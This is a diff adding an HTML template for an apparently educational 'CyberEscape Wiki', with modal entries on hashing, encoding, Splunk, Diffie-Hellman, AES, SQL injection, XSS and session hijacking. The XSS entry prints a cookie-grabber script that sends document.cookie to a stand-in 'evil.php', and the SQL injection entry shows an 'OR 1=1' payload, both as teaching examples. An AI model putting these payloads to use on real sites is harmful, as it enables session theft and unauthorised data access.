@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<title>Cyberescape Wiki</title>
+		<meta name="description" content="" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link
+			rel="stylesheet"
+			href="{{ url_for('static', filename='style.css')}}"
+		/>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400" >
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700" >
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400" >
+	</head>
+    <body>
+        <div style="display: inline-block; width: 100%; height: 100%;" data-ignore="used only for top most containter width">
+            <div class="main-header-container">
+                <div class="header-container">
+                <div class="cyber-scaping-container">
+                <img class="image-container1 img-content-cb0a6a63" />
+                </div>
+                <p class="gradient-text-title">
+                <span class="cyber-scape">CyberEscape Wiki</span>
+                </p>
+                </div>
+                <div class="navbar">
+                <div class="navigation-bar">
+                <p class="navigation-link">About</p>
+                <p class="navigation-link">Contact</p>
+                <p class="navigation-link">News</p>
+                </div>
+                <a href="/logout">
+                <button class="register-button register-link">Log out</button>
+                </a> 
+                </div>
+            </div>
+            <div class="game-profile-leaderboard">
+                <div class = "wiki-title">Welcome to the CyberEscape Wiki. Click any box to learn more.</div>
+                <div class = "wiki-modal">
+                    <div class = "wiki-modal-content">
+                        <h1 class = "wiki-modal-title"></h1>
+                        <span class = "wiki-modal-close">&times;</span>
+                        <p class = "wiki-modal-text"></p>
+                    </div>
+                </div>
+                <div class = "wiki-grid-container">
+                    <div class = "wiki-md5">MD5</div>
+                    <div class = "wiki-sha1">SHA-1</div>
+                    <div class = "wiki-base64">Base64</div>
+                    <div class = "wiki-splunk">Splunk</div>
+                    <div class = "wiki-diffie">Diffie–Hellman key exchange</div>
+                    <div class = "wiki-steg">Steganography</div>
+                    <div class = "wiki-aes">Advanced Encryption Standard (AES)</div>
+                    <div class = "wiki-sql">SQL Injection</div>
+                    <div class = "wiki-xss">Cross Site Scripting (XSS)</div>
+                    <div class = "wiki-hijack">Session Hijacking</div>
+                </div>
+                
+            </div>
+        </div>
+        <script>
+            var wikiModalClose = document.querySelector(".wiki-modal-close")
+            var wikiModal = document.querySelector(".wiki-modal")
+            var wikiModalText = document.querySelector(".wiki-modal-text")
+            var wikiModalTitle = document.querySelector(".wiki-modal-title")
+            var wikiMd5 = document.querySelector(".wiki-md5")
+            var wikiSha1 = document.querySelector(".wiki-sha1")
+            var wikiBase64 = document.querySelector(".wiki-base64")
+            var wikiSplunk = document.querySelector(".wiki-splunk")
+            var wikiDiffie = document.querySelector(".wiki-diffie")
+            var wikiSteg = document.querySelector(".wiki-steg")
+            var wikiAes = document.querySelector(".wiki-aes")
+            var wikiSql = document.querySelector(".wiki-sql")
+            var wikiXss = document.querySelector(".wiki-xss")
+            var wikiHijack = document.querySelector(".wiki-hijack")          
+           
+            wikiMd5.addEventListener('click', () => {
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='MD5'
+                wikiModalText.innerHTML='MD5 or Message Digest is an older cryptographic hashing algorithm that converts any random length of data into a fixed length of 32 hexadecimal digits or 16 bytes (128-bit). For example the MD5 hash value of “this is a MD5 hash generator.” will be “b45a4e2fbd5414de0b7dad0e8a5ad15d”<br><br>It was designed by Ronald Rivest in 1991. Hash function is a one-way function which means the hash value cannot be reversed to figure out the original input data. It is deterministic, that is the same input will always result in the same hash value. Any small change to the input will change the hash value significantly.<br><br>MD5 is mainly used to verify the integrity of a file and it is faster to generate. It is an insecure algorithm as it can lead to collisions, which means two different inputs of data can generate the same MD5 hash value and with modern computers it can be easily attacked.'
+
+            })
+
+            wikiSha1.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='SHA-1'
+                wikiModalText.innerHTML='SHA1 or Secure Hash Algorithm 1 is a hash function that produces a 160-bit or 20 byte hash value (40 hexadecimal digits). It was designed by the United States National Security Agency (NSA). For example the SHA1 hash value of “this is a sha1 hash generator.” is “2654004d47ad843b10b38b98932221a0d19c6ce5”.<br><br>SHA1 was used to store passwords or check the integrity of a file but it was found vulnerable to attack hence its use has been deprecated. More stronger hash algorithms in SHA family are being in use such as SHA-256, SHA-384 or SHA-512. The use of these cryptographic hash function is to protect communications from being intercepted from third party by generating irreversible hash value, check the data or file integrity by comparing the original hash value and the hah value of transferred data or file, it can be used to confirm the legitimacy of digital signatures / documents, and for storing passwords.'
+            })
+
+            wikiBase64.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Base64'
+                wikiModalText.innerHTML="Base64 is a binary-to-text encoding method to transform any characters into a readable string. It uses 64 basic characters and replaces each 3 bytes with 4 bytes. It is most commonly used to encode binary data such as images or sound files, for embedding into HTML, CSS, Emails, and other text documents. Unlike a hash function, it is reversible and the data can be decoded easily. While it's not suitable for encryption or compression, it is valuable for data portability between systems that might have different interpretations of binary values.<br><br> For example the Base64 for “this is a base64 generator.” is “dGhpcyBpcyBhIGJhc2U2NCBnZW5lcmF0b3Iu”."
+            })
+
+            wikiSplunk.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Splunk'
+                wikiModalText.innerHTML='Splunk is a powerful data platform used for collecting, indexing, searching, and analysing machine-generated data in real-time. It provides organisations with valuable insights and operational intelligence by transforming raw data into meaningful and actionable information. It can be used for cybersecurity, compliance, data pipelines, IT operations, intelligence, monitoring or business management. By offering real-time insights, Splunk empowers industries to make data-driven decisions, enhance operational efficiency, ensure security, and deliver improved user experiences.<br><br>Founded in 2003, Splunk is a global company  — with over 7,500 employees. The platform uses its own query language - SPL (Search Processing Language). It is a domain-specific language tailored for data analysis, making it easier for both technical and non-technical users to gain insights from their data without requiring extensive programming skills.<br><br>An example of a splunk query is:<br><br>index=security sourcetype=auth (event_type=login OR event_type=failed_login)<br>| stats count by user, event_type<br>| sort - count<br>| where event_type="failed_login"<br><br>In this example, the query searches for authentication events in the specified index and sourcetype. It then calculates the count of successful logins and failed login attempts for each user. The results are sorted in descending order based on the count of failed login attempts, and the query filters the results to show only rows related to failed login events.<br><br>An index in Splunk is a repository or storage location where the raw data is stored. For example, there might be different indexes for security-related data, application logs, network logs etc. This separation allows to control retention policies, access permissions, and data management strategies for different types of data.<br><br>A sourcetype in Splunk is a metadata attribute assigned to incoming data to identify its source or format. It provides information about how the data should be parsed, categorised, and processed during indexing. Sourcetypes help Splunk understand the structure of the data, enabling it to extract fields and create events from the raw data.'
+            })
+
+            wikiDiffie.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Diffie–Hellman key exchange'
+                wikiModalText.innerHTML="The Diffie-Hellman key exchange was one of the most important developments in public-key cryptography. It was developed by Whitfield Diffie and Martin Hellman in 1976. The main purpose of the Diffie-Hellman key exchange is the ability to establish secure communications over public channels between two parties that don’t know each other. Generally, it's used for encryption, password-authenticated key agreement and forward security. Password-authenticated key agreements are used to prevent man-in-the-middle attacks. Forward secrecy-based protocols protect against the compromising of keys by generating new key pairs for each session.<br><br>Diffie-Hellman key exchange is commonly found in security protocols, such as Transport Layer Security (TLS), Secure Shell (SSH) and IP Security (IPsec).<br><br>Example:<br>Step 1: Bob and Alice get public numbers N = 541, G = 10<br><br>Step 2: Bob selected a private key X = 5 and Alice selected a private key Y = 7<br><br>Step 3: Bob and Alice compute public values<br>Bob: A=G^x mod N; A = (10^5 mod 541) = 456<br>Alice: B=G^y mod N; B=(10^97 mod 541) = 156<br><br>Step 4: Alice and Bob exchange public numbers (456 and 156)<br><br>Step 5: Bob and Alice compute same shared symmetric keys<br>Bob: key = B^x mod N = 92389579776 mod 541 = 193<br>Alice: key = A^y mod N = 4099717187644686336 mod 541 = 193<br><br>Step 6: 193 is the shared secret.<br><br>For Further details check out: https://asecuritysite.com/keyexchange/diffie"
+            })
+
+            wikiSteg.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Steganography'
+                wikiModalText.innerHTML="Steganography, derived from the Greek words 'steganos' (hidden or covered) and 'graph' (to write), is a technique that involves concealing secret information within seemingly innocuous files or messages, ensuring covert communication. It enables users to hide nearly any type of digital content, such as text, images, videos, or audio, within other digital content, making detection difficult. The hidden data, often referred to as hidden text, is usually encrypted or processed to heighten its concealment.<br><br>Steganography serves various purposes, including conveying secret messages or codes. While it has legitimate applications, it has also been exploited by malware developers to hide malicious code transmissions.Today, steganography finds use in watermarking, a technique that embeds identifying data or trademarks in multimedia files. Online publishers employ watermarking to track unauthorised sharing of media files. A common application involves embedding a text file within an image, imperceptibly altering less significant bits in the data to accommodate the hidden message. This can be done manually or with steganography tools.<br><br>Steganography differs from cryptography but can complement it to enhance data security and evade detection. Encrypting steganographically-hidden data maintains its secrecy, although the channel itself may become vulnerable. The key advantage of steganography paired with encryption is its ability to obscure the presence of sensitive data within the carrier file or content. Unlike encrypted files that are marked as such, steganography maintains the secrecy of the secure channel."
+            })
+
+            wikiAes.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Advanced Encryption Standard (AES)'
+                wikiModalText.innerHTML="The Advanced Encryption Standard (AES) is a symmetric block cipher, extensively used worldwide in software and hardware for encrypting sensitive information. Developed by the National Institute of Standards and Technology (NIST) in response to the vulnerabilities of the Data Encryption Standard (DES), AES was created in 1997. An essential characteristic of AES lies in its symmetric nature. In this framework, the same key is employed for both encrypting and decrypting data. This key must be shared and utilised by both the sender and recipient.<br><br>AES operates through three distinct block ciphers, each denoted by their key lengths:<br><br>AES-128: Utilises a 128-bit key length for the encryption and decryption of message blocks.<br>AES-192: Engages a 192-bit key length to secure message blocks through encryption and decryption.<br>AES-256: Employs a robust 256-bit key length for the encryption and decryption of message blocks.<br><br>Each cipher encrypts and decrypts data in blocks of 128 bits using cryptographic keys of 128, 192 and 256 bits, respectively.<br><br>AES encryption faces a notable risk from side-channel attacks, which aim to extract leaked information from a system to compromise AES security. They involve gathering data on a device's behaviour during cryptographic operations to reverse-engineer its cryptography system. Mitigation involves preventing data leakage avenues and using randomization techniques to disassociate cipher-protected data from leaked information, thwarting attackers' pattern deduction."
+            })
+
+            wikiSql.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='SQL Injection'
+                wikiModalText.innerHTML='Attackers use SQL injection (SQLi) technique to gain unauthorised access to a web application database by adding a string of malicious code to a database query.<br><br>A SQL injection manipulates Structured Query Language code to provide access to protected resources, such as sensitive data, or execute malicious SQL statements. When executed correctly, a SQL injection can expose intellectual property, customer data or the administrative credentials of a private business.<br><br>SQL injection typically occurs over the Internet by sending malicious SQL queries to an API endpoint provided by a website or service. In its most severe form, SQL injection can allow an attacker to gain root access to a machine, giving them complete control.<br><br>To implement this kind of an attack, the attacker injects malicious code into the query’s input form. Usually, a SQL query is a request for some action to be performed on an application database or run operating system commands. Each query includes a set of parameters that ensure only desired records are returned when a user runs the query.<br><br>For example:<br><br>studentId = getRequestString("studentId");<br>lookupStudent = "SELECT * FROM students WHERE studentId = "" + studentId;<br><br>To turn this into an SQLi attack, one possible way is to change it to this:<br>SELECT * FROM students WHERE studentId = 117 OR 1=1;<br><br>As 1=1 is always true, as a result, the database will return all data from the students table back to the attacker making the query.<br><br>Commonly used tools exist that allow a malicious actor to automatically search through a website looking for forms, and then attempt to input various SQL queries that may generate a response that the website’s software developers did not intend in order to exploit the database.'
+            })
+
+            wikiXss.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Cross Site Scripting (XSS)'
+                wikiModalText.innerHTML='Cross-Site Scripting (XSS) attacks represent a form of injection wherein malicious scripts are inserted into trusted websites. These attacks transpire when an adversary exploits a web application to transmit harmful code, usually in the form of a browser-side script, to an unintended recipient. Vulnerabilities that facilitate the success of such attacks are widespread, manifesting wherever a web application incorporates user-input data into its output without validation or encoding.<br><br>By utilising XSS, a perpetrator can dispatch a malicious script to an unsuspecting user. Mistakenly perceiving the script as originating from a dependable source, the malicious script gains access to sensitive data such as cookies, session tokens, and other sensitive information stored by the browser and used with that specific site. In more alarming scenarios, these scripts can even modify the content of the HTML page itself.<br><br>Example: Cookie Grabber<br>If the application doesn’t validate the input data, the attacker can easily steal a cookie from an authenticated user. All the attacker has to do is to place the following code in any posted input (ie: message boards, private messages, user profiles):<br><br>&lt;script type="text/javascript"&gt;<br>var adr = "../evil.php?cakemonster=" + escape(document.cookie);<br>&lt;/script&gt;<br><br>The above code will pass an escaped content of the cookie to the evil.php script in “cakemonster” variable. The attacker then checks the results of their evil.php script and uses it.'
+            })
+
+            wikiHijack.addEventListener('click',()=>{
+                wikiModal.classList.add('active')
+                wikiModalTitle.innerHTML='Session Hijacking'
+                wikiModalText.innerHTML='Session hijacking is a technique used by hackers to gain access to a target’s computer or online accounts. In a session hijacking attack, a hacker takes control of a user’s browsing session to gain access to their personal information and passwords.<br><br>Many common types of session hijacking involve grabbing the user’s session cookie, locating the session ID within the cookie, and using that information to take over the session. When the attacker gets the session ID, they can take over the session without being detected. <br><br>Session hijacking can be either active or passive. In active session hijacking, the attacker takes control of the target’s session while it is still active. The attacker does this by sending a spoofed request to the server that includes the target’s session ID. Cybercriminals can also trick a person into clicking a link that would install malware on their device to allow them to hijack a session.<br><br>Passive session hijacking occurs when the attacker eavesdrops on network traffic to steal the target’s session ID. This type of attack is easier to execute because all an attacker needs is access to network traffic, which can be easily accomplished if they are on the same network as the target'
+            })
+
+            wikiModalClose.addEventListener('click', () => {
+                wikiModal.classList.remove('active')
+            })
+
+        </script>
+    </body>
+</html>
